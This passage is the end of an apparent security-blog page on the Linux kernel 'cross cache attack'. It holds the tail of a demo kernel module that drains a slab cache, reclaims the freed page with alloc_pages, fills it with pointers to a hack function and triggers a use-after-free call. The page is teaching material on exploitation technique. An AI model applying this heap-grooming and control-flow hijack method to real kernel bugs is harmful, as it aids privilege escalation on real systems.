class="string">&quot;&gt;&gt; make vuln page is empty\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; objs_per_slab; i++) &#123;</span><br><span class="line">        kmem_cache_free(my_cachep, tmp_ms[uaf_idx + i]);</span><br><span class="line">        kmem_cache_free(my_cachep, tmp_ms[uaf_idx - i]);</span><br><span class="line">        tmp_ms[uaf_idx + i] = <span class="literal">NULL</span>;</span><br><span class="line">        tmp_ms[uaf_idx - i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;=== STEP 7 ===&quot;</span>);</span><br><span class="line">    loge(<span class="string">&quot;&gt;&gt; free one object per page\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (objs_per_slab * (cpu_partial + <span class="number">1</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % objs_per_slab == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp_ms[i]) &#123;</span><br><span class="line">                kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">                tmp_ms[i] = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;let&#x27;s check if we can get the vuln page ...&quot;</span>);</span><br><span class="line">    <span class="built_in">realloc</span> = alloc_pages(GFP_KERNEL, page_order);</span><br><span class="line">    realloc_page_virt = page_address(<span class="built_in">realloc</span>);</span><br><span class="line">    loge(<span class="string">&quot;realloc page at %px&quot;</span>, realloc_page_virt);</span><br><span class="line">    <span class="keyword">if</span> (realloc_page_virt == target_page_virt) &#123;</span><br><span class="line">        loge(<span class="string">&quot;realloc SUCCESS :)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        loge(<span class="string">&quot;cross page attack failed :(&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;assume we has the ability to overwrite the content of page&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; page_size / <span class="number">8</span>; i++) &#123;</span><br><span class="line">        ((<span class="type">void</span> **)realloc_page_virt)[i] = (<span class="type">void</span> *)hack_func;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loge(<span class="string">&quot;now, let&#x27;s call func again (UAF)&quot;</span>);</span><br><span class="line">    ms-&gt;func();</span><br><span class="line"></span><br><span class="line">    free_page((<span class="type">unsigned</span> <span class="type">long</span>)realloc_page_virt);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">km_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; OBJ_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp_ms[i]) &#123;</span><br><span class="line">            kmem_cache_free(my_cachep, tmp_ms[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kmem_cache_free(my_cachep, random_ms);</span><br><span class="line">    kmem_cache_destroy(my_cachep);</span><br><span class="line">    kfree(tmp_ms);</span><br><span class="line">    loge(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(km_init);</span><br><span class="line">module_exit(km_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;X++D &amp;&amp; veritas&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Cross Page Attack Demo Module.&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br></pre></td></tr></table></figure>



<p><img src="/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/image-20230307193059916.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li>
        
      </ul>
    </div>

    
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&text=Cross Cache Attack技术细节分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&is_video=false&description=Cross Cache Attack技术细节分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Cross Cache Attack技术细节分析&body=Check out this article: https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&title=Cross Cache Attack技术细节分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&name=Cross Cache Attack技术细节分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2023_03_07-Cross%20Cache%20Attack%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%86%E6%9E%90/&t=Cross Cache Attack技术细节分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    veritas501
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
